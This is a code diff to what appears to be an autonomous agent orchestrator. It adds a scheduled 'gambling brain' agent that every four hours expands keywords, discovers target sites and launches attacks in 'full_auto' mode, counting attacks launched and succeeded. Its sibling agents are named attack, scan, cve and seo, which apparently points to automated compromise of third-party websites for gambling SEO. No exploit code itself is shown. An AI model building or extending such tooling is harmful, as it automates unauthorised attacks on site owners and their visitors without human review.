@@ -26,6 +26,7 @@ import { executeLearningCycle } from "./learning-scheduler";
 import { runResearchCycle, type ResearchTarget } from "./autonomous-research-engine";
 import { triggerManualCveUpdate } from "./cve-scheduler";
 import { runKeywordDiscovery } from "./keyword-target-discovery";
+import { runBrainCycle } from "./gambling-ai-brain";
 import { getDb } from "./db";
 import { agenticSessions, seoProjects } from "../drizzle/schema";
 import { eq, and, sql, desc, inArray } from "drizzle-orm";
@@ -54,7 +55,7 @@ export interface OrchestratorState {
   cycleCount: number;
 }
 
-type AgentName = "attack" | "seo" | "scan" | "research" | "learning" | "cve" | "keyword_discovery";
+type AgentName = "attack" | "seo" | "scan" | "research" | "learning" | "cve" | "keyword_discovery" | "gambling_brain";
 
 // ═══════════════════════════════════════════════
 //  DEFAULT AGENT CONFIGS
@@ -118,6 +119,15 @@ const DEFAULT_AGENTS: Record<AgentName, AgentConfig> = {
   keyword_discovery: {
     enabled: true,
     intervalMs: 3 * 60 * 60 * 1000, // Every 3 hours
+    maxConcurrent: 1,
+    autoStart: true,
+    consecutiveFailures: 0,
+    totalRuns: 0,
+    totalSuccesses: 0,
+  },
+  gambling_brain: {
+    enabled: true,
+    intervalMs: 4 * 60 * 60 * 1000, // Every 4 hours
     maxConcurrent: 1,
     autoStart: true,
     consecutiveFailures: 0,
@@ -367,6 +377,49 @@ async function executeKeywordDiscoveryTask(task: DaemonTask, signal: AbortSignal
 }
 
 // ═══════════════════════════════════════════════
+//  GAMBLING BRAIN AGENT
+// ═══════════════════════════════════════════════
+
+/**
+ * Gambling Brain Agent Executor — runs a full intelligence cycle:
+ * keyword expansion → smart target discovery → auto-attack
+ */
+async function executeGamblingBrainTask(task: DaemonTask, signal: AbortSignal): Promise<{ success: boolean; result?: Record<string, unknown>; error?: string }> {
+  try {
+    const result = await runBrainCycle({
+      maxKeywordsPerCycle: (task.config?.maxKeywords as number) || 30,
+      maxTargetsPerCycle: (task.config?.maxTargets as number) || 20,
+      maxAttacksPerCycle: (task.config?.maxAttacks as number) || 10,
+      attackMode: "full_auto",
+      expandKeywords: true,
+      notifyOnCycleComplete: true,
+      notifyOnAttackSuccess: true,
+      notifyOnDiscovery: true,
+    });
+
+    return {
+      success: result.status === "completed" || result.status === "partial",
+      result: {
+        cycleId: result.cycleId,
+        duration: result.duration,
+        keywordsProcessed: result.keywordsProcessed,
+        newKeywordsDiscovered: result.newKeywordsDiscovered,
+        targetsDiscovered: result.targetsDiscovered,
+        highPriorityTargets: result.highPriorityTargets,
+        attacksLaunched: result.attacksLaunched,
+        attacksSucceeded: result.attacksSucceeded,
+        attacksFailed: result.attacksFailed,
+        status: result.status,
+        summary: result.summary,
+        message: `Gambling Brain cycle: ${result.keywordsProcessed} keywords, ${result.targetsDiscovered} targets, ${result.attacksLaunched} attacks (${result.attacksSucceeded} succeeded)`,
+      },
+    };
+  } catch (err: any) {
+    return { success: false, error: err.message };
+  }
+}
+
+// ═══════════════════════════════════════════════
 //  ORCHESTRATOR TICK — Main loop
 // ═══════════════════════════════════════════════
 
@@ -402,6 +455,7 @@ async function orchestratorTick() {
         learning: "learning_cycle",
         cve: "cve_update",
         keyword_discovery: "keyword_discovery",
+        gambling_brain: "gambling_brain_cycle",
       };
 
       const taskId = await enqueueTask({
@@ -454,6 +508,7 @@ export function startOrchestrator(customAgents?: Partial<Record<AgentName, Parti
   registerExecutor("learning_cycle", executeLearningTask);
   registerExecutor("cve_update", executeCveTask);
   registerExecutor("keyword_discovery", executeKeywordDiscoveryTask);
+  registerExecutor("gambling_brain_cycle", executeGamblingBrainTask);
 
   // Set initial next-run times (stagger to avoid thundering herd)
   const now = Date.now();
